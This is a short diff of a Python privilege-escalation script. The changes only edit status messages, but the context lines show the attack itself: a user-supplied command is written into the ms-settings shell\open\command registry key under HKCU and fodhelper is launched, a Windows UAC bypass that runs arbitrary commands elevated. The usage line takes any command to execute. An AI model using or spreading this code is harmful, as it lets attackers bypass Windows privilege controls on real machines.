@@ -125,6 +125,7 @@ def exploit(command_to_execute):
     subprocess.run('reg add hkcu\\Software\\Classes\\ms-settings\\shell\\open\\command /t REG_SZ /d "'+command_to_execute+'" /f', stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
 
     os.system(run_fodhelper)
+    print("exploited successfully.")
 
     return True
 
@@ -155,7 +156,7 @@ if __name__ == "__main__":
             else:
                 print("Error windows version is not supported.")
         else:
-            print("This script is running as administrator!")
+            print("This script is already running as administrator.")
     else:
         file_name= os.path.basename(__file__)
         print(f"usage: python {file_name} \"command_to_execute\"")
